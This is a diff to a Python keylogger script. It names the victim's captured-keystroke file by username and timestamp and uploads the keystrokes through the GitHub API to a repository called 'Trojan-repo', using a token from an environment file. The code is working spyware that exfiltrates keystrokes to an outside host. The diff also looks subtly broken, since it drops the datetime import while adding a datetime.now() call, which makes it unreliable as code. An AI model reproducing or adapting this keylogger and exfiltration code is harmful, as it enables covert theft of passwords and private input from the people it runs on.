@@ -4,14 +4,11 @@ import time
 import socket
 import platform
 import psutil
-from datetime import datetime
 import os
 import json
 import requests
 import base64
-import socket
 import threading
-import json
 from dotenv import load_dotenv
 
 class Keylogger:
@@ -67,18 +64,20 @@ print("Keylogger has stopped.")
 # Output the captured log
 print(f"Captured keystrokes: {keylogger.output}")
 
-
+# Generate dynamic file path
+username = os.environ.get("USER") or os.environ.get("USERNAME") or "Unknown"
+current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+file_path = f"data/keylogger_{username}_{current_time}.txt"
 
 # GitHub repository details
 repository_owner = "BlertaJashanica"
 repository_name = "Trojan-repo"
-file_path = "data/keylogger.txt"  # Correct file path with filename
-file_content = json.dumps(keylogger.output, indent=4)  # Convert dict to JSON string for GitHub
+file_content = json.dumps(keylogger.output, indent=4)  # Convert captured keys to JSON string for GitHub
 
 load_dotenv()  # Load environment variables from .env file
 github_token = os.getenv("GITHUB_TOKEN")
 
-commit_message = 'Updated system info'
+commit_message = 'Updated keylogger data'
 
 # GitHub API URL
 api_url = f"https://api.github.com/repos/{repository_owner}/{repository_name}/contents/{file_path}"
@@ -111,5 +110,3 @@ if response.status_code in [200, 201]:
     print("File pushed successfully!")
 else:
     print("An error occurred while pushing the file:", response.json())
-
-
